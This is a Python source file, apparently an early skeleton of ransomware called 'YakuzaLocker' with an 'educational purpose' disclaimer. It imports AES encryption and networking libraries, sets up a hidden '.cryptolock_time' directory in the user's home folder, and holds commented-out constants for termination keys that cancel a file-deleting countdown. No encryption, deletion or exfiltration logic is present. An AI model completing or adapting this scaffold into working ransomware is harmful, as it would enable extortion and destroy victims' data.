"""Main file of YakuzaLocker
Main file to Combine all Components of YakuzaLocker together
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""

import os
import sys
import requests
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import uuid
from datetime import datetime, timedelta
import time
import ctypes
import logging
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk


# Defining Function to load the current path of ransom.py and then join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return os.path.join(basePath, relative_path)

# Create Function to Ensure the time Directory Exist
def ensure_time_dir_exist():
    if not os.path.exists(TIME_DIR):
        os.makedirs(TIME_DIR)


# Create Function to Load Machine ID
def load_machine_id():
    pass






#Global constants
#Termination keys used to close app and cancel Deleting Operation
# TERMINATION_KEY = "bingo"
# SECONDARY_TERMINATION_KEY = "stop"
#
HOME_DIR = os.path.expanduser('~')
TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
# TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
# ICON_PATH = resource_path("img/app_icon.ico")
# LOGO_PATH = resource_path("img/logo.png")
# THANKS_PATH = resource_path("img/thank-you.png")














